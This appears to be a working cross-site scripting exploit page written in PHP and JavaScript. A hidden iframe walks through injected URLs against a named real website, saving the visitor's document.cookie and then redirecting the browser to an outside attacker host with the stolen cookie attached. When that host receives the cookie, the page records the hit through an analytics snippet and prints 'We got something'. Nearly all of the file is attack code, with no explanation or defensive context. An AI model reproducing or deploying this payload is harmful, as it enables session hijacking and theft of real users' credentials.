<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<!-- 
Can't embed google.com in an iframe because of this:
https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options
-->
<?php
if (isset($_GET['c'])):
?>
	<script>
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-64761074-1', 'auto');
	  ga('send', 'pageview');

	</script>
We got something
<?else:?>
<script type="text/javascript" charset="utf-8">
var done = "hacking.tassusa.com"
var prefix = "http://www.revesoft.com/news/news_about_us?year=%22%3E%3Cscript/src=data:,";
var postfix = "%2b%22";
var steps = [
	"localStorage.setItem(%27l%27,location.href.substr(0,7)%2B'"+done+"')",
	"localStorage.setItem(%27q%27,location.href.substr(42,1)%2B%27c=%27)",
	"localStorage.setItem(%27c%27,escape(document.cookie))",//.substr(0,53)
	"location=localStorage.getItem(%27l%27)%2BlocalStorage.getItem(%27q%27)%2BlocalStorage.getItem(%27c%27)"
];
//, == %2C
var on_step = 0;
function loaded(el){
	var url = get_next_url();
	if (url){
		el.src = url;
	}else{
		console.log("now at:", el.src);
	}
}
function get_next_url(){
	if (on_step < steps.length){
		var url = prefix + steps[on_step] + postfix;
		console.log('loading url #', on_step, "(", url, ")");
		on_step++;
		return url;
	}
}
</script>
<iframe id="frame" onload="loaded(this)"></iframe>
<?php endif; ?>
</body>
</html>

